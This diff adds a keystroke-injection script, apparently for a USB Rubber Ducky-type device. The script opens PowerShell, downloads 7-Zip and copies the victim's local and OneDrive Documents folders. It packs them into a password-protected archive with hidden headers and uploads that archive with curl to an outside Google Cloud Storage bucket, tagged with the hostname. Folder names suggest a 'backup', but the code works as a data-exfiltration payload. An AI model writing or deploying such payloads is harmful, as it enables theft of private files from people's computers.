@@ -1,0 +1,14 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING $downloadUrl="https://www.7-zip.org/a/7zr.exe";$backupFolder="$env:USERPROFILE\Desktop\Scripts\Secure_Backups_No_Delete";$sevenZipExe=Join-Path $backupFolder "7zr.exe";$localDocuments="$env:USERPROFILE\Documents";$onedriveDocuments="$env:USERPROFILE\OneDrive\Documents";$stagingFolder=Join-Path $backupFolder "staging";$archivePath=Join-Path $backupFolder "Documents_Backup.7z";foreach($folder in @($backupFolder,$stagingFolder)){if(-not(Test-Path $folder)){New-Item -Path $folder -ItemType Directory | Out-Null}};if(-not(Test-Path $sevenZipExe)){Invoke-WebRequest -Uri $downloadUrl -OutFile $sevenZipExe};
+ENTER
+DELAY 1000
+STRING Copy-Item -Path $localDocuments -Destination (Join-Path $stagingFolder "LocalDocuments") -Recurse -Force;Copy-Item -Path $onedriveDocuments -Destination (Join-Path $stagingFolder "OneDriveDocuments") -Recurse -Force;Start-Process -FilePath $sevenZipExe -ArgumentList "a","`"$archivePath`"","`"$stagingFolder\*`"","-pPW","-mhe" -NoNewWindow -Wait;
+ENTER
+DELAY 1000
+STRING $hostname=$env:COMPUTERNAME;$timestamp=Get-Date -Format 'yyyy-MM-dd_HH-mm-ss';$backupFile=$archivePath;$bucketName="uploaddemo";$objectName="$hostname/$timestamp`_Documents_Backup.7z";$uploadUrl="https://www.googleapis.com/upload/storage/v1/b/$bucketName/o?uploadType=media&name=$objectName";if(-not(Test-Path $backupFile)){Write-Host "Backup file not found: $backupFile";exit};$arguments="-X POST -H `"Content-Type: application/octet-stream`" --data-binary `@`"$backupFile`" `"$uploadUrl`"";Start-Process -FilePath "curl.exe" -ArgumentList $arguments -NoNewWindow -Wait;
+ENTER
